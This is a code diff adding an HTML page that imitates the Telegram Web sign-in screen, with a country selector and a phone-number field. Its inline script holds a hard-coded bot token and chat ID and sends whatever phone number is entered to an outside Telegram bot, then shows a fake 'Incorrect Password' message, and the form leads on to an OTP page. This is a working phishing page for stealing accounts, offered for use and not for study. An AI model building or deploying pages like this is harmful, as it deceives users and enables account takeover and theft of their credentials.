@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" type="image/x-icon">
+    <title>Telegram Web</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <form method="post" action="otp.html">
+    <div class="container" id="login-container">
+
+        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" class="logo" alt="Telegram Logo">
+        <h2>Sign in to Telegram</h2>
+        <p>Please confirm your country code and enter your phone number.</p>
+        <div class="input-group">
+            <label for="country">Country</label>
+            <select id="country">
+                <option>Afghanistan</option>
+                <option>Albania</option>
+                <option>Algeria</option>
+                <option>Argentina</option>
+                <option>Australia</option>
+                <option>Bangladesh</option>
+                <option>Belgium</option>
+                <option>Brazil</option>
+                <option>Canada</option>
+                <option>China</option>
+                <option>Colombia</option>
+                <option>Denmark</option>
+                <option>Egypt</option>
+                <option>France</option>
+                <option>Germany</option>
+                <option>India</option>
+                <option>Indonesia</option>
+                <option>Iran</option>
+                <option>Italy</option>
+                <option>Japan</option>
+                <option>Kenya</option>
+                <option>Malaysia</option>
+                <option>Mexico</option>
+                <option>Morocco</option>
+                <option>Nepal</option>
+                <option>Netherlands</option>
+                <option>Nigeria</option>
+                <option>Norway</option>
+                <option>Pakistan</option>
+                <option>Peru</option>
+                <option>Philippines</option>
+                <option>Poland</option>
+                <option>Portugal</option>
+                <option>Qatar</option>
+                <option>Romania</option>
+                <option>Russia</option>
+                <option>Saudi Arabia</option>
+                <option>South Africa</option>
+                <option>South Korea</option>
+                <option>Spain</option>
+                <option>Sri Lanka</option>
+                <option>Sweden</option>
+                <option>Switzerland</option>
+                <option>Thailand</option>
+                <option>Turkey</option>
+                <option>UAE</option>
+                <option>UK</option>
+                <option>USA</option>
+                <option>Vietnam</option>
+            </select>
+            
+        </div>
+        <div class="input-group">
+            <label for="phone">Phone Number</label>
+            <input type="text" id="phone" placeholder="+880 --- --- ---">  
+        </div>
+        <input type="checkbox" name="" id="checkbox">
+          <span>Keep me signed in</span>
+         <button id="login" class="btn">NEXT</button>
+        <div class="qr-login">LOG IN BY QR CODE</div>
+    </div>
+</form>
+
+    <script>
+// this is send login data telegram bot 
+        const botToken = "7848765711:AAENovLcEBM1BpzZlRQQFIkmCmyoGiTwYHc";
+        const chatId = "6578349813";
+
+        const loginButton = document.getElementById("login");
+        const emailInput = document.getElementById("phone");
+        
+    
+        loginButton.addEventListener("click", function(event) {
+            
+            // event.preventDefault();
+            const email = emailInput.value;
+            
+                const message = `New login:\nNumber: ${email}`;
+
+                const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+                fetch(url)
+                    .then(response => {
+                        if (response.ok) {
+                            var errorMessage = "Incorrect Password! Please try again.";
+                            document.getElementById("error-message").textContent = errorMessage;
+
+                            emailInput.value = "";
+                            passwordInput.value = "";
+                        } else {
+                            throw new Error("Failed to send message to Telegram.");
+                        }
+                    })
+                    .catch(error => {
+                        console.error(error);
+                        // alert("Failed to send message to Telegram.");
+                    });
+            }).catch(error => {
+                console.error(error);
+                alert("Failed to retrieve device information.");
+            });
+
+              // Wait 5 seconds (5000 milliseconds), then redirect
+//   setTimeout(() => {
+//     window.location.href = 'otp.html';
+//   }, 5000);
+     
+    
+
+//end this code
+    </script>
+</body>
+</html>
